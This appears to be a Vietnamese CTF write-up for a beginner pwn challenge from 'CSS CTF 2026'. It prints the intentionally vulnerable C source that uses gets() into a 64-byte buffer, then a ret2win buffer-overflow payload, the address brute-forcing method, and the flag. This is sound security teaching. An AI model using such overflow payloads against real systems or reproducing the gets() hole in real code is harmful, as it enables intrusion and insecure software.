# Kuiper Belt Relay Core - Pwn (Beginner)

**Sự kiện:** CSS CTF 2026
**Category:** Pwn
**Độ khó:** Beginner (50 điểm)

## Đề bài

`vuln()` đọc dữ liệu bằng `gets()` vào `char buffer[64]`. Hàm `win()` đọc và in flag nhưng không được gọi trong luồng chạy bình thường. Mục tiêu là ghi đè return address để chuyển điều khiển sang `win()`.

Source:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void win() {
    printf("\nYou hijacked the return address!\n");
    printf("Here's your flag:\n");
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        printf("Error: flag.txt not found on server.\n");
        exit(1);
    }
    char flag[128];
    if (fgets(flag, sizeof(flag), f)) {
        printf("%s\n", flag);
    }
    fclose(f);
    exit(0);
}

void vuln() {
    char buffer[64];
    printf("This program is a simple echo service.\n");
    printf("Enter your message: ");
    gets(buffer);
    printf("You said: %s\n", buffer);
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    printf("Goodbye!\n");
    return 0;
}
```


## Phân tích

- Buffer có kích thước 64 byte.
- Payload `"A"*71` vẫn nhận được `Goodbye!`; với `"A"*72`, thông báo này không xuất hiện. Kết quả phù hợp với việc return address bị ảnh hưởng ở offset 72: 64 byte buffer và 8 byte saved RBP.
- Các địa chỉ tìm được thuộc dải `0x40xxxx` và có thể dùng lại giữa các lần kết nối trong thử nghiệm.

## Hướng đã thử

### Stack leak qua output của echo

Đã thử payload `b"A"*n + b"%s%s%s..."` nhưng không thu được địa chỉ hữu ích. Source dùng `printf("You said: %s\n", buffer)` với format string cố định: các ký tự `%s` trong input không được xử lý như format specifier.

Ngoài ra, `gets()` thêm NUL ngay sau input; việc in buffer bằng `%s` dừng ở NUL này. Vì vậy, output của echo không cung cấp stack leak cho cách thử trên. Lời giải chuyển sang dò địa chỉ dựa trên phản hồi của server.

## Lời giải

**Bước 1 - Xác định offset của return address.**

Tăng độ dài payload và kiểm tra `Goodbye!`:

```text
Chuỗi "A"*64 → Trạng thái bình thường, phản hồi chứa "Goodbye!"
Chuỗi "A"*71 → Trạng thái bình thường, phản hồi chứa "Goodbye!"
Chuỗi "A"*72 → Trạng thái bất thường, chỉ phản hồi ký tự ngắt dòng (Mất "Goodbye!")
```


Kết quả xác định offset 72 cho payload ret2win.

**Bước 2 - Dò địa chỉ `win()`.**

Không có binary local để disassemble, nên thử các địa chỉ trong khoảng `0x401000` đến `0x401500`.

- Payload: `b"A"*72 + low_bytes(addr)`, theo little-endian.
- Oracle: phản hồi chứa `hijacked` hoặc `CSSCTF`.

Địa chỉ tìm được là **`0x401216`**.

**Bước 3 - Tạo payload.**

Với địa chỉ `0x401216`, payload dùng ba byte thấp `0x16 0x12 0x40`: `b"A"*72 + b"\x16\x12\x40"`.

**Bước 4 - Kiểm tra trên server.**

Gửi payload trong ba phiên độc lập. Cả ba đều gọi được `win()` và trả flag.

## Kết quả

```text
CSSCTF{s1gn4l_r3c0v3r3d_fr0m_th3_v01d}
```


## Tái hiện

```bash
python exploit.py
```


Output:

```text
This program is a simple echo service.
Enter your message: You hijacked the return address!
Here's your flag:
CSSCTF{s1gn4l_r3c0v3r3d_fr0m_th3_v01d}
```


## Files

- `exploit.py`: script chạy lời giải.
- `de.png`: ảnh đề bài.
- `analysis/`: script dò địa chỉ và ghi lại các thử nghiệm.
